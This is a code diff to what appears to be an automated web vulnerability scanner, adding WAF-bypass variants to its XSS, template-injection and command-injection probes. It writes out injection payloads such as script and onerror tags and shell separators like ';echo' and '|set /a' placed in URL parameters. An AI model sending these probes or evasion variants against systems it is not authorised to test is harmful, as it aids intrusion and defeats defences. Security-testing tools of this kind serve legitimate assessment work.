@@ -8,6 +8,7 @@ import shutil
 from pathlib import Path
 
 from core.harness.auth_context import client as auth_client, sqlmap_args as _sqlmap_auth_args, auth_cookies, auth_headers
+from core.harness.payload_mutator import get_variants as _waf_variants
 from core.tools import probes_ext
 
 SANDBOX_DIR = Path(os.getenv("KRYX_SANDBOX_DIR") or os.getenv("HEXOR_SANDBOX_DIR", "/tmp/kryx-sandbox"))
@@ -574,7 +575,10 @@ async def _xss_probe(url: str) -> dict:
         ct = resp.headers.get("content-type", "").lower()
         return ("html" in ct) or (not ct)
 
-    PAYLOAD_TAIL = "<svg/onload=alert(1)>"
+    _XSS_BASE = ["<svg/onload=alert(1)>", "<img src=x onerror=alert(1)>",
+                 "<script>alert(1)</script>"]
+    _XSS_TAILS = _waf_variants(_XSS_BASE, "xss")
+    PAYLOAD_TAIL = _XSS_TAILS[0]   # keep existing single-payload paths working
     findings = []
 
     async with auth_client(timeout=8, follow_redirects=True, verify=False) as client:
@@ -584,15 +588,19 @@ async def _xss_probe(url: str) -> dict:
         for pname in params:
             m = _mark()
             tp = {k: v[0] for k, v in params.items()}
-            tp[pname] = m + PAYLOAD_TAIL
-            turl = urlunparse(parsed._replace(query=urlencode(tp)))
-            try:
-                r = await client.get(turl)
-                if m + PAYLOAD_TAIL in r.text and _is_html(r):
-                    findings.append({"type": "reflected", "vector": f"GET param '{pname}'",
-                                     "context": _ctx(r.text, m)})
-            except Exception:
-                pass
+            found = False
+            for tail in _XSS_TAILS:
+                tp[pname] = m + tail
+                turl = urlunparse(parsed._replace(query=urlencode(tp)))
+                try:
+                    r = await client.get(turl)
+                    if m + tail in r.text and _is_html(r):
+                        findings.append({"type": "reflected", "vector": f"GET param '{pname}'",
+                                         "context": _ctx(r.text, m), "payload": tail})
+                        found = True
+                        break
+                except Exception:
+                    pass
 
         # 2) Forms on the page -> reflected (POST echo) or stored (persists).
         try:
@@ -893,13 +901,18 @@ async def _ssti_probe(url: str) -> dict:
         for pname in qs:
             a, b = random.randint(100000, 999999), random.randint(11, 97)
             product = str(a * b)
-            tmpls = [
+            _base_tmpls = [
                 (f"{{{{{a}*{b}}}}}", "jinja2/twig"),
                 (f"${{{a}*{b}}}", "jsp_el"),
                 (f"#{{{a}*{b}}}", "ruby_thymeleaf"),
                 (f"<%= {a}*{b} %>", "erb"),
                 (f"{{{a}*{b}}}", "generic"),
             ]
+            # Expand with WAF-bypass variants when WAF is active
+            _ssti_payloads = _waf_variants([pl for pl, _ in _base_tmpls], "ssti")
+            # Reconstruct (payload, engine_hint) pairs — new variants get "generic" label
+            _pl_to_hint = {pl: h for pl, h in _base_tmpls}
+            tmpls = [(pl, _pl_to_hint.get(pl, "generic")) for pl in _ssti_payloads]
             detected = None
             for pl, engine_hint in tmpls:
                 tp = {k: v[0] for k, v in qs.items()}
@@ -985,13 +998,13 @@ async def _cmdi_probe(url: str) -> dict:
             a, b = random.randint(100000, 999999), random.randint(11, 97)
             product = str(a * b)
             # Phase 1: arithmetic separators
-            arith_payloads = [
+            _arith_base = [
                 f";echo $(({a}*{b}))", f"|echo $(({a}*{b}))", f"&&echo $(({a}*{b}))",
                 f"$(({a}*{b}))", f"$(expr {a} \\* {b})", f"`expr {a} \\* {b}`",
                 f";expr {a} \\* {b}", f"\necho $(({a}*{b}))",
-                # Windows
                 f"&echo {a}*{b}", f"|set /a {a}*{b}",
             ]
+            arith_payloads = _waf_variants(_arith_base, "cmdi")
             confirmed_sep = None
             for inj in arith_payloads:
                 tp = {k: v[0] for k, v in qs.items()}
